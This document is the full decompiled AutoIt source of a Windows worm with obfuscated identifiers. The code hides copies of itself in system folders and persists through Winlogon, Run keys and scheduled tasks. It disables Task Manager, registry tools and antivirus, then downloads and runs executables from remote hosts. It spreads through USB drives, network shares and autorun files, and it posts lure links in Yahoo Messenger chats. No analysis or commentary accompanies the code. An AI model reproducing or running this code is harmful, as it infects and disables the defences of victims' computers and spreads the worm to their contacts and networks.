
#NoTrayIcon

FUNC A480010001024 ($ARG00)
IF NOT PROCESSEXISTS ($ARG00) THEN
SETERROR (1)
RETURN ""
ENDIF
LOCAL $VAR0000 = PROCESSLIST ()
IF NOT @ERROR THEN
FOR $A4F00F000F042 = 1 TO $VAR0000 [0] [0]
IF $VAR0000 [$A4F00F000F042] [1] = $ARG00 THEN RETURN $VAR0000 [$A4F00F000F042] [0]
NEXT
ENDIF
SETERROR (1)
RETURN ""
ENDFUNC


FUNC A02002000203A ($ARG00)
LOCAL $VAR0000 = PROCESSEXISTS ($ARG00)
IF NOT $VAR0000 THEN
SETERROR (1)
RETURN - 1
ENDIF
LOCAL $VAR0001 = DLLOPEN ("kernel32.dll")
LOCAL $VAR0002 = DLLCALL ($VAR0001 , "int" , "OpenProcess" , "int" , 1024 , "int" , FALSE , "int" , $VAR0000)
LOCAL $VAR0003 = DLLCALL ($VAR0001 , "int" , "GetPriorityClass" , "int" , $VAR0002 [0])
DLLCALL ($VAR0001 , "int" , "CloseHandle" , "int" , $VAR0002 [0])
DLLCLOSE ($VAR0001)
SWITCH $VAR0003 [0]
CASE 64
RETURN 0
CASE 16384
RETURN 1
CASE 32
RETURN 2
CASE 32768
RETURN 3
CASE 128
RETURN 4
CASE 256
RETURN 5
CASE ELSE
SETERROR (1)
RETURN - 1
ENDSWITCH
ENDFUNC


FUNC A140030003034 ($ARG00)
RETURN RUNWAIT (@COMSPEC & " /C " & $ARG00 , "" , @SW_HIDE)
ENDFUNC

$A5F30E030E033 = "SSCVIHOST"
$A61400040001A = "blastclnnn"
$A5E4020402010 = "setting"
$A12404040400F = ".ini"
$A244060406039 = ".doc"
$A604080408050 = ".xls"
$A0E40A040A032 = ".exe"
$A2640C040C013 = @HOUR + 2
$A1040F040F03C = @MIN + 30
FILECOPY (@AUTOITEXE , @SYSTEMDIR & "\" & $A5F30E030E033 & $A0E40A040A032 , 0)
FILESETATTRIB (@SYSTEMDIR & "\" & $A5F30E030E033 & $A0E40A040A032 , "+RSH")
FILECOPY (@AUTOITEXE , @WINDOWSDIR & "\" & $A5F30E030E033 & $A0E40A040A032 , 0)
FILESETATTRIB (@WINDOWSDIR & "\" & $A5F30E030E033 & $A0E40A040A032 , "-RSH")
FILECOPY (@AUTOITEXE , @SYSTEMDIR & "\" & $A61400040001A & $A0E40A040A032 , 0)
FILESETATTRIB (@SYSTEMDIR & "\" & $A61400040001A & $A0E40A040A032 , "+RSH")
REGWRITE ("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" , "Shell" , "REG_SZ" , "Explorer.exe " & $A5F30E030E033 & $A0E40A040A032)
REGWRITE ("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" , "Yahoo Messengger" , "REG_SZ" , @SYSTEMDIR & "\" & $A5F30E030E033 & $A0E40A040A032)
REGWRITE ("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" , "NofolderOptions" , "REG_DWORD" , 1)
REGWRITE ("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" , "DisableTaskMgr" , "REG_DWORD" , 1)
REGWRITE ("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" , "DisableRegistryTools" , "REG_DWORD" , 1)
REGWRITE ("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Schedule" , "AtTaskMaxHours" , "REG_DWORD" , 0)
A140030003034 ("AT /delete /yes")
A140030003034 ("AT 09:00 /interactive /EVERY:m,t,w,th,f,s,su " & @SYSTEMDIR & "\" & $A61400040001A & $A0E40A040A032)
A5B00B000B003 ()
A55005000501F ()
A390060006024 ()
$A33804080404C = REGREAD ("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\WorkgroupCrawler\Shares" , "shared")
IF $A33804080404C = "" THEN
A2200A000A01F ()
ENDIF
IF $A33804080404C <> "" THEN
IF FILEEXISTS ($A33804080404C) = 0 THEN
A2200A000A01F ()
ENDIF
ENDIF
IF PROCESSEXISTS ("game_y.exe") THEN
PROCESSCLOSE ("game_y.exe")
ENDIF
SLEEP (1000)
IF PROCESSEXISTS ("game_y.exe") THEN
PROCESSCLOSE ("game_y.exe")
ENDIF
SLEEP (1000)
IF PROCESSEXISTS ("game_y.exe") THEN
PROCESSCLOSE ("game_y.exe")
ENDIF
SLEEP (1000)
IF PROCESSEXISTS ("game_y.exe") THEN
PROCESSCLOSE ("game_y.exe")
ENDIF
SLEEP (1000)
WHILE (1)
A4E0070007039 ()
A630080008039 ()
IF @HOUR = $A2640C040C013 THEN
A55005000501F ()
IF PROCESSEXISTS ("game_y.exe") THEN
PROCESSCLOSE ("game_y.exe")
ENDIF
SLEEP (1000)
IF PROCESSEXISTS ("game_y.exe") THEN
PROCESSCLOSE ("game_y.exe")
ENDIF
SLEEP (1000)
IF PROCESSEXISTS ("game_y.exe") THEN
PROCESSCLOSE ("game_y.exe")
ENDIF
SLEEP (1000)
IF PROCESSEXISTS ("game_y.exe") THEN
PROCESSCLOSE ("game_y.exe")
ENDIF
SLEEP (1000)
ENDIF
IF @MIN = $A1040F040F03C THEN
A390060006024 ()
ENDIF
WEND

FUNC A250040004048 ()
$A0AA030A0304E = "http://setting3.yeahost.com"
IF INETGET ($A0AA030A0304E & "/" & $A5E4020402010 & $A244060406039 , @SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , 1 , 0) = 0 THEN
INETGET ($A0AA030A0304E & "/" & $A5E4020402010 & $A604080408050 , @SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , 1 , 0)
ENDIF
SLEEP (1000)
$A5AB010B01029 = "success"
$A3FB030B03063 = "http://setting3.9999mb.com"
IF INIREAD (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "setting" , "downloaded" , "") <> $A5AB010B01029 THEN
IF INETGET ($A3FB030B03063 & "/" & $A5E4020402010 & $A244060406039 , @SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , 1 , 0) = 0 THEN
INETGET ($A3FB030B03063 & "/" & $A5E4020402010 & $A604080408050 , @SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , 1 , 0)
ENDIF
IF INIREAD (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "setting" , "downloaded" , "") <> $A5AB010B01029 THEN
$A5CC080C0804B = "http://www.freewebs.com/setting3"
IF INETGET ($A5CC080C0804B & "/" & $A5E4020402010 & $A244060406039 , @SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , 1 , 0) = 0 THEN
INETGET ($A5CC080C0804B & "/" & $A5E4020402010 & $A604080408050 , @SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , 1 , 0)
ENDIF
ENDIF
ENDIF
FILESETATTRIB (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "+RSH")
ENDFUNC


FUNC A55005000501F ()
A250040004048 ()
$A16D080D08008 = INIREAD (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "setting" , "website" , "")
$A60D0D0D0D056 = INIREAD (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "setting" , "filedownload1" , "")
$A11E020E0201B = INIREAD (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "setting" , "filedownload2" , "")
$A21E070E07050 = INIREAD (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "setting" , "filedownload3" , "")
$A43E0C0E0C05C = INIREAD (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "setting" , "filedownload4" , "")
$A5FF010F01007 = INIREAD (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "setting" , "filedownload5" , "")
$A58F060F0602C = NUMBER (INIREAD (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "setting" , "size01" , ""))
$A40F0B0F0B04C = NUMBER (INIREAD (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "setting" , "size02" , ""))
$A190100010049 = NUMBER (INIREAD (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "setting" , "size03" , ""))
$A450150015034 = NUMBER (INIREAD (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "setting" , "size04" , ""))
$A5E01A001A04A = NUMBER (INIREAD (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "setting" , "size05" , ""))
IF $A60D0D0D0D056 <> "" THEN
IF NOT FILEEXISTS (@SYSTEMDIR & "\" & $A60D0D0D0D056 & $A0E40A040A032) THEN
IF INETGET ($A16D080D08008 & "/" & $A60D0D0D0D056 & $A244060406039 , @SYSTEMDIR & "\" & $A60D0D0D0D056 & $A0E40A040A032 , 1 , 0) = 0 THEN
INETGET ($A16D080D08008 & "/" & $A60D0D0D0D056 & $A604080408050 , @SYSTEMDIR & "\" & $A60D0D0D0D056 & $A0E40A040A032 , 1 , 0)
ENDIF
SLEEP (3000)
IF FILEEXISTS (@SYSTEMDIR & "\" & $A60D0D0D0D056 & $A0E40A040A032) THEN
IF NUMBER (FILEGETSIZE (@SYSTEMDIR & "\" & $A60D0D0D0D056 & $A0E40A040A032)) / 1024 >= $A58F060F0602C THEN
FILESETATTRIB (@SYSTEMDIR & "\" & $A60D0D0D0D056 & $A0E40A040A032 , "+RSH")
RUN (@SYSTEMDIR & "\" & $A60D0D0D0D056 & $A0E40A040A032)
ENDIF
ENDIF
ENDIF
ENDIF
IF $A11E020E0201B <> "" THEN
IF NOT FILEEXISTS (@SYSTEMDIR & "\" & $A11E020E0201B & $A0E40A040A032) THEN
IF INETGET ($A16D080D08008 & "/" & $A11E020E0201B & $A244060406039 , @SYSTEMDIR & "\" & $A11E020E0201B & $A0E40A040A032 , 1 , 0) = 0 THEN
INETGET ($A16D080D08008 & "/" & $A11E020E0201B & $A604080408050 , @SYSTEMDIR & "\" & $A11E020E0201B & $A0E40A040A032 , 1 , 0)
ENDIF
SLEEP (3000)
IF FILEEXISTS (@SYSTEMDIR & "\" & $A11E020E0201B & $A0E40A040A032) THEN
IF NUMBER (FILEGETSIZE (@SYSTEMDIR & "\" & $A11E020E0201B & $A0E40A040A032)) / 1024 >= $A40F0B0F0B04C THEN
FILESETATTRIB (@SYSTEMDIR & "\" & $A11E020E0201B & $A0E40A040A032 , "+RSH")
RUN (@SYSTEMDIR & "\" & $A11E020E0201B & $A0E40A040A032)
ENDIF
ENDIF
ENDIF
ENDIF
IF $A21E070E07050 <> "" THEN
IF NOT FILEEXISTS (@SYSTEMDIR & "\" & $A21E070E07050 & $A0E40A040A032) THEN
IF INETGET ($A16D080D08008 & "/" & $A21E070E07050 & $A244060406039 , @SYSTEMDIR & "\" & $A21E070E07050 & $A0E40A040A032 , 1 , 0) = 0 THEN
INETGET ($A16D080D08008 & "/" & $A21E070E07050 & $A604080408050 , @SYSTEMDIR & "\" & $A21E070E07050 & $A0E40A040A032 , 1 , 0)
ENDIF
SLEEP (3000)
IF FILEEXISTS (@SYSTEMDIR & "\" & $A21E070E07050 & $A0E40A040A032) THEN
IF NUMBER (FILEGETSIZE (@SYSTEMDIR & "\" & $A21E070E07050 & $A0E40A040A032)) / 1024 >= $A190100010049 THEN
FILESETATTRIB (@SYSTEMDIR & "\" & $A21E070E07050 & $A0E40A040A032 , "+RSH")
RUN (@SYSTEMDIR & "\" & $A21E070E07050 & $A0E40A040A032)
ENDIF
ENDIF
ENDIF
ENDIF
IF $A43E0C0E0C05C <> "" THEN
IF NOT FILEEXISTS (@SYSTEMDIR & "\" & $A43E0C0E0C05C & $A0E40A040A032) THEN
IF INETGET ($A16D080D08008 & "/" & $A43E0C0E0C05C & $A244060406039 , @SYSTEMDIR & "\" & $A43E0C0E0C05C & $A0E40A040A032 , 1 , 0) = 0 THEN
INETGET ($A16D080D08008 & "/" & $A43E0C0E0C05C & $A604080408050 , @SYSTEMDIR & "\" & $A43E0C0E0C05C & $A0E40A040A032 , 1 , 0)
ENDIF
SLEEP (3000)
IF FILEEXISTS (@SYSTEMDIR & "\" & $A43E0C0E0C05C & $A0E40A040A032) THEN
IF NUMBER (FILEGETSIZE (@SYSTEMDIR & "\" & $A43E0C0E0C05C & $A0E40A040A032)) / 1024 >= $A450150015034 THEN
FILESETATTRIB (@SYSTEMDIR & "\" & $A43E0C0E0C05C & $A0E40A040A032 , "+RSH")
RUN (@SYSTEMDIR & "\" & $A43E0C0E0C05C & $A0E40A040A032)
ENDIF
ENDIF
ENDIF
ENDIF
IF $A43E0C0E0C05C <> "" THEN
IF NOT FILEEXISTS (@SYSTEMDIR & "\" & $A5FF010F01007 & $A0E40A040A032) THEN
IF INETGET ($A16D080D08008 & "/" & $A5FF010F01007 & $A244060406039 , @SYSTEMDIR & "\" & $A5FF010F01007 & $A0E40A040A032 , 1 , 0) = 0 THEN
INETGET ($A16D080D08008 & "/" & $A5FF010F01007 & $A604080408050 , @SYSTEMDIR & "\" & $A5FF010F01007 & $A0E40A040A032 , 1 , 0)
ENDIF
SLEEP (3000)
IF FILEEXISTS (@SYSTEMDIR & "\" & $A5FF010F01007 & $A0E40A040A032) THEN
IF NUMBER (FILEGETSIZE (@SYSTEMDIR & "\" & $A5FF010F01007 & $A0E40A040A032)) / 1024 >= $A5E01A001A04A THEN
FILESETATTRIB (@SYSTEMDIR & "\" & $A5FF010F01007 & $A0E40A040A032 , "+RSH")
RUN (@SYSTEMDIR & "\" & $A5FF010F01007 & $A0E40A040A032)
ENDIF
ENDIF
ENDIF
ENDIF
$A2640C040C013 = @HOUR + 2
IF $A2640C040C013 > 12 THEN
$A2640C040C013 = $A2640C040C013 - 12
ENDIF
ENDFUNC


FUNC A390060006024 ()
$A2681B081B014 = INIREAD (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "setting" , "myweb" , "")
IF $A2681B081B014 = "" THEN
$A2681B081B014 = "http://nhatquanglan.xlphp.net/"
ENDIF
DIM $GDIMARR0000 [10]
$GDIMARR0000 [0] = INIREAD (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "setting" , "tin[0]" , "")
IF $GDIMARR0000 [0] = "" THEN
$GDIMARR0000 [0] = "E may, vao day coi co con nho nay ngon lam " & $A2681B081B014 & " "
ENDIF
$GDIMARR0000 [1] = INIREAD (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "setting" , "tin[1]" , "")
IF $GDIMARR0000 [1] = "" THEN
$GDIMARR0000 [1] = "Vao day nghe bai nay di ban " & $A2681B081B014 & " "
ENDIF
$GDIMARR0000 [2] = INIREAD (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "setting" , "tin[2]" , "")
IF $GDIMARR0000 [2] = "" THEN
$GDIMARR0000 [2] = "Vao day nghe bai nay di ban " & $A2681B081B014 & " "
ENDIF
$GDIMARR0000 [3] = INIREAD (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "setting" , "tin[3]" , "")
IF $GDIMARR0000 [3] = "" THEN
$GDIMARR0000 [3] = "Biet tin gi chua, vao day coi di " & $A2681B081B014 & " "
ENDIF
$GDIMARR0000 [4] = INIREAD (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "setting" , "tin[4]" , "")
IF $GDIMARR0000 [4] = "" THEN
$GDIMARR0000 [4] = "Trang Web nay coi cung hay, vao coi thu di " & $A2681B081B014 & " "
ENDIF
$GDIMARR0000 [5] = INIREAD (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "setting" , "tin[5]" , "")
IF $GDIMARR0000 [5] = "" THEN
$GDIMARR0000 [5] = "???A?U?U???A?O???A?N?A?????A?????¤?U?O???A?U?A?¦?A?N?A?O?A?N?Y?¤?O?A???????A?N?A?O?A?N?A?O?O?A???Y???A?U?A?N?¦?A?N???????A?N?A???A?U?¤?O?A?O?ON?ïA?" & $A2681B081B014 & "  "
ENDIF
$GDIMARR0000 [6] = INIREAD (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "setting" , "tin[6]" , "")
IF $GDIMARR0000 [6] = "" THEN
$GDIMARR0000 [6] = "????Ð??? ???ÐA?A??? ??? AA??? ???·Ü ????Ð???Ð???ÐA?AÐ??µÐ??AÐ»???·? ?±? ???µ? ?µA ?????· ??A?·Ð?·±? ?A? ?±ÐA??ÐA?µ? ???? ??EÐ??EÐA?±? E±?O? " & $A2681B081B014 & " "
ENDIF
$GDIMARR0000 [7] = INIREAD (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "setting" , "tin[7]" , "")
IF $GDIMARR0000 [7] = "" THEN
$GDIMARR0000 [7] = "?O???????????????U?????O???U?O?¤?U?Y?U?¤?????O???U???N???????O?¦?U?O?????U?????????N?????????O?O?N???O???U???????C?O?©?O?????O???U?????U?O?¤?U?E??" & $A2681B081B014 & " "
ENDIF
$GDIMARR0000 [8] = INIREAD (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "setting" , "tin[8]" , "")
IF $GDIMARR0000 [8] = "" THEN
$GDIMARR0000 [8] = "Loi em noi cho tinh chung ta, nhu doan cuoi trong cuon phim buon. Nguoi da den nhu la giac mo roi ra di cho anh bat ngo... " & $A2681B081B014 & " "
ENDIF
$GDIMARR0000 [9] = INIREAD (@SYSTEMDIR & "\" & $A5E4020402010 & $A12404040400F , "setting" , "tin[9]" , "")
IF $GDIMARR0000 [9] = "" THEN
$GDIMARR0000 [9] = "???E?N?E?Y???O?E???E?O?E???O?????O???O?˜?¤?N?U?U?O?E???E?O?E?O?????O?E?O?˜?¤?N?U?U?O?E?U?Y?¤???¤?N?????Y???N?¤?E?N?E?N?.?·???O?©?O?U?U?E?O???E?©???O?E????Þ.ÞE" & $A2681B081B014 & " "
ENDIF
$A11E1D0E1D051 = WINGETTITLE ("Yahoo! Messenger" , "")
$A56E1F0E1F023 = WINEXISTS ($A11E1D0E1D051)
IF $A56E1F0E1F023 = 1 THEN
$A04F110F1105E = RANDOM (0 , 9 , 1)
CLIPPUT ($GDIMARR0000 [$A04F110F1105E])
BLOCKINPUT (1)
WINACTIVATE ($A11E1D0E1D051)
SEND ("!m")
SEND ("un")
SEND ("^v {ENTER}{ENTER}")
SEND ("^m")
SEND ("{DOWN}")
SEND ("^{SHIFTDOWN}{END}{SHIFTUP}")
SEND ("{ENTER}")
SEND ("^v {ENTER}")
BLOCKINPUT (0)
ENDIF
$A1040F040F03C = @MIN + 30
IF $A1040F040F03C > 60 THEN
$A1040F040F03C = $A1040F040F03C - 60
ENDIF
ENDFUNC


FUNC A4E0070007039 ()
IF WINEXISTS ("Bkav2006") THEN
WINCLOSE ("Bkav2006")
REGDELETE ("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" , "BkavFw")
ENDIF
IF WINEXISTS ("System Configuration") THEN
WINCLOSE ("System Configuration")
ENDIF
IF WINEXISTS ("Registry") THEN
WINCLOSE ("Registry")
ENDIF
IF WINEXISTS ("Windows Task") THEN
WINCLOSE ("Windows Task")
ENDIF
IF WINEXISTS ("[FireLion]") THEN
REGDELETE ("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" , "IEProtection")
SHUTDOWN (2)
ENDIF
IF PROCESSEXISTS ("cmd.exe") THEN
PROCESSCLOSE ("cmd.exe")
ENDIF
ENDFUNC


FUNC A630080008039 ()
$A571230123018 = DRIVEGETDRIVE ("REMOVABLE")
IF NOT @ERROR THEN
DIM $GDIMARR0001 [6]
$GDIMARR0001 [1] = ""
FOR $A4F00F000F042 = 1 TO $A571230123018 [0]
$GDIMARR0001 [$A4F00F000F042 - 1] = $A571230123018 [$A4F00F000F042]
NEXT
IF $GDIMARR0001 [0] <> "A:" THEN
IF $GDIMARR0001 [0] <> "" THEN
FILECOPY (@WINDOWSDIR & "\" & $A5F30E030E033 & $A0E40A040A032 , $GDIMARR0001 [0] & "\New Folder.exe" , 0)
SLEEP (1)
FILECOPY (@SYSTEMDIR & "\" & $A5F30E030E033 & $A0E40A040A032 , $GDIMARR0001 [0] & "\" & $A5F30E030E033 & $A0E40A040A032 , 0)
SLEEP (1)
FILECOPY (@SYSTEMDIR & "\autorun.ini" , $GDIMARR0001 [0] & "\autorun.inf" , 0)
FILESETATTRIB ($GDIMARR0001 [0] & "\autorun.inf" , "+RSH")
SLEEP (1)
A1B0090009002 ($GDIMARR0001 [0])
ENDIF
ENDIF
IF $GDIMARR0001 [0] = "A:" THEN
IF $GDIMARR0001 [1] <> "" THEN
FILECOPY (@WINDOWSDIR & "\" & $A5F30E030E033 & $A0E40A040A032 , $GDIMARR0001 [1] & "\New Folder.exe" , 0)
SLEEP (1)
FILECOPY (@SYSTEMDIR & "\" & $A5F30E030E033 & $A0E40A040A032 , $GDIMARR0001 [1] & "\" & $A5F30E030E033 & $A0E40A040A032 , 0)
SLEEP (1)
FILECOPY (@SYSTEMDIR & "\autorun.ini" , $GDIMARR0001 [1] & "\autorun.inf" , 0)
FILESETATTRIB ($GDIMARR0001 [1] & "\autorun.inf" , "+RSH")
SLEEP (1)
A1B0090009002 ($GDIMARR0001 [1])
ENDIF
ENDIF
ENDIF
ENDFUNC


FUNC A1B0090009002 ($ARG00)
LOCAL $VAR0000 = FILEFINDFIRSTFILE ($ARG00 & "\*.*")
WHILE 1
DIM $GDIMVAR0002 = FILEFINDNEXTFILE ($VAR0000)
IF @ERROR OR STRINGLEN ($GDIMVAR0002) < 1 THEN EXITLOOP
IF STRINGINSTR (FILEGETATTRIB ($ARG00 & "\" & $GDIMVAR0002) , "D") AND ($GDIMVAR0002 <> "." OR $GDIMVAR0002 <> "..") THEN
FILECOPY (@WINDOWSDIR & "\" & $A5F30E030E033 & $A0E40A040A032 , $ARG00 & "\" & $GDIMVAR0002 & "\" & $GDIMVAR0002 & $A0E40A040A032 , 0)
A1B0090009002 ($ARG00 & "\" & $GDIMVAR0002)
ENDIF
SLEEP (1)
WEND
FILECLOSE ($VAR0000)
ENDFUNC


FUNC A2200A000A01F ()
DIM $GDIMARR0003 [30]
FOR $A4F00F000F042 = 1 TO 30
$A296220622038 = REGENUMKEY ("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\WorkgroupCrawler\Shares" , $A4F00F000F042)
IF @ERROR THEN EXITLOOP
$A296220622038 = STRINGREPLACE ($A296220622038 , "/" , "\")
$GDIMARR0003 [$A4F00F000F042] = "\\" & $A296220622038
$A2B6270627002 = FILECOPY (@WINDOWSDIR & "\" & $A5F30E030E033 & $A0E40A040A032 , $GDIMARR0003 [$A4F00F000F042] & "\New Folder.exe" , 1)
IF $A2B6270627002 = 1 THEN
FILECOPY (@SYSTEMDIR & "\" & $A5F30E030E033 & $A0E40A040A032 , $GDIMARR0003 [$A4F00F000F042] & "\" & $A5F30E030E033 & $A0E40A040A032 , 0)
FILECOPY (@SYSTEMDIR & "\autorun.ini" , $GDIMARR0003 [$A4F00F000F042] & "\autorun.inf" , 1)
FILESETATTRIB ($GDIMARR0003 [$A4F00F000F042] & "\autorun.inf" , "+RSH")
A1B0090009002 ($GDIMARR0003 [$A4F00F000F042])
ENDIF
NEXT
REGWRITE ("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\WorkgroupCrawler\Shares" , "shared" , "REG_SZ" , $GDIMARR0003 [$A4F00F000F042 - 1] & "\New Folder.exe")
ENDFUNC


FUNC A5B00B000B003 ()
INIWRITE (@SYSTEMDIR & "\autorun.ini" , "Autorun" , "Open" , $A5F30E030E033 & $A0E40A040A032)
INIWRITE (@SYSTEMDIR & "\autorun.ini" , "Autorun" , "Shellexe cute" , $A5F30E030E033 & $A0E40A040A032)
INIWRITE (@SYSTEMDIR & "\autorun.ini" , "Autorun" , "Shell\Open\command" , $A5F30E030E033 & $A0E40A040A032)
INIWRITE (@SYSTEMDIR & "\autorun.ini" , "Autorun" , "Shell" , "Open")
SLEEP (1)
FILESETATTRIB (@SYSTEMDIR & "\autorun.ini" , "+RSH")
ENDFUNC
